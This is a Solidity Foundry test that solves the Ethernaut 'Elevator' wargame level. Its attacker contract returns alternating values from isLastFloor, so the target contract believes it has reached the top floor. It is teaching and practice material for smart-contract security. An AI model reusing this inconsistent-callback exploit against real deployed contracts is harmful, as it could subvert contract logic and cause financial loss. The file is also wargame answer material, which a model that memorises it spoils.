// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/11-Elevator/ElevatorFactory.sol";
import "../src/Ethernaut.sol";

interface IElevator {
    function goTo(uint _floor) external;
}

contract VirtualOverride {
    IElevator public elevator;
    uint private constant LAST_FLOOR = 20;
    bool private trigger;
    bool private isLast = true;

    constructor(address _elevator) {
        elevator = IElevator(_elevator);
    }

    function virtualOverride() external payable returns (bool) {
        elevator.goTo(LAST_FLOOR);
        return true;
    }
    // It will be ran 1st on if validation, so it goes from true to false
    // Runs second time to validate top and goes from false to true
    // floor uint is just a distraction
    function isLastFloor(uint) external returns (bool) {
        isLast = !isLast;
        return isLast;
    }
}

contract ElevatorTest is Test {
    Ethernaut ethernaut;
    address playerAddress = address(6529);

    function setUp() public {
        ethernaut = new Ethernaut();
    }

    function testElevator() public {
        // Level setup
        ElevatorFactory elevatorFactory = new ElevatorFactory();
        ethernaut.registerLevel(elevatorFactory);
        vm.startPrank(playerAddress);
        address levelAddress = ethernaut.createLevelInstance(elevatorFactory);
        Elevator ethernautElevator = Elevator(payable(levelAddress));

        // Level attack
        VirtualOverride attack = new VirtualOverride(levelAddress);
        attack.virtualOverride();

        // Level submission
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
